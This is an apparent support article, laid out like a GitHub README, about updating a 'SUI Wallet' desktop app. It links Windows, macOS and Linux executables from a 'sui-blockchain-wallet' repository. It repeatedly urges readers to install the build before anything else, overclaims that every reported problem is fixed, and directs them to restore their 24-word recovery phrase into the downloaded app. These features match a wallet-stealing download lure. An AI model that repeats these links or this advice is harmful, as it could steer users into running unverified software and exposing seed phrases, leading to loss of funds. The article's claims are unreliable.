![SUI Wallet](assets/banner-article.png)

# Updating SUI Wallet to the latest release

The current release is the fix for most reported problems; here is how to move to it.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Every problem readers have reported against this wallet is implemented in the current release, so
installing it is the fix rather than a workaround. Check the build in the diagnostics panel, compare it
with the changelog, then run the [current release](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).
Updating replaces the application, not the account: the account is the 24 words, so write the phrase down
before you update.

## How to tell which build is installed

The app has a diagnostics panel that names the version it is running, the network it is connected to and
the digest of the last transaction it handled. The version line is the only reliable answer to "am I
current" - a file date in a Downloads folder says when you downloaded something, not what is running now.

That matters because two copies can coexist: an older one in a folder you forgot about, and the current
one you installed last month. The panel tells you which one you actually launched.

## The changelog and what it lists

The changelog lists one line per version, newest first, and it is linked from the release. That order is the point: the top line is the current release, and everything under it is history, so the comparison against your build takes a glance rather than a search.

Read it for two things and ignore the rest. First, whether the build in your diagnostics panel appears at
all - if it does not, it predates the changelog's first entry and is old. Second, whether the feature a
guide describes is named in any entry; a screen that a guide describes and your build does not have is
the most common reason a walkthrough stops matching.

## Updating over an existing install

Updating is running the current release's file for your platform, which is the same file a first install uses. The [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) is where an update comes from, and it is the same place the first install came from, so there is nothing separate to learn.

[SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md) covers which of the three files belongs to which machine, and the
digest check that tells you the file arrived intact. Do that check on an update for the same reason you
do it on a first install: an updater is an executable that runs with your permissions, and the release
digest is the only way to know it is the one the project published.

Close the app before you run the installer, and open it again once the install finishes. If the window
does not come back, [SUI Wallet won't open after install](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-wont-open-after-install.md) covers the three causes in the order
worth checking.

## What survives an update, and what to do if it does not

The application files are replaced. The account is not a file in that folder: it is derived from the 24 words, which is why the phrase, not the profile, is what makes an account recoverable, and why the backup matters more than the install.

So the honest answer to "will my accounts still be there" is: they will be, because the words still
derive them, and you should not depend on that being invisible. Write the phrase down before updating.
If the new build opens and the account is missing from the list, restore from the phrase - the app shows
the addresses it derived before it reports success, so you can see at once whether it found the funded one.

That is a short detour, and it is the difference between an update that goes wrong harmlessly and one
that goes wrong while the only copy of the words is inside the old build's folder.

## When a guide no longer matches what you see

Documentation describes the current release, so a reader on an older build will meet mismatches between what a guide shows and what the app shows. Sorting them into three kinds - a missing screen, a screen that looks different, a step that never existed - decides whether to update or to stop reading the guide.

- **A screen the guide names is missing.** The build is older than the feature.
- **A screen looks different.** Wording moved; the function did not.
- **A step does not exist at all.** Usually a step that was never in the product, read from a
  third-party page about a different wallet.

In all three cases, update and read again before concluding the product is broken. The changelog tells
you whether the screen you are looking for exists in the current release at all.

## Updating is not the same as removing and reinstalling

Removing the app and installing it again is a removal followed by a fresh start, and it is the wrong move for an update: it fixes nothing that updating would not fix, it costs the same download, and it turns a short job into a setup you walk through again from the beginning.

There is a place for a full removal - a machine being handed on, or an install that is genuinely broken
in a way updating did not fix - and
[How to uninstall SUI Wallet completely](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-uninstall-sui-wallet-completely.md) covers it, including what has to be gone before the
machine is passed on. It is a deliberate step, not a first response.

## FAQ

### How do I update SUI Wallet without losing my accounts?

Write the 24 words down, run the current release, and open the app. The accounts come from the phrase,
not from the installation, so if the list is empty after the update, restore from the phrase and check
the addresses the app shows before it reports success.

### How often should I update?

Whenever the changelog has a line above the version in your diagnostics panel. There is no schedule to
watch: the release page is the source, and the changelog makes the comparison a glance.

### Does updating change my address?

No. The address is derived from the words, and the words do not change because the application did.

### The update installed and now the window will not open. Did I break it?

Almost certainly not. Close every copy, run the current release again, and if the window still does not
appear, work through the three causes on the won't-open page before doing anything else - reinstalling
an older build is the one move that makes this worse.

### Can I skip a release and jump straight to the current one?

Yes. Each release is a complete application, so the current one is all you need; there is no chain of
intermediate updates to walk through.
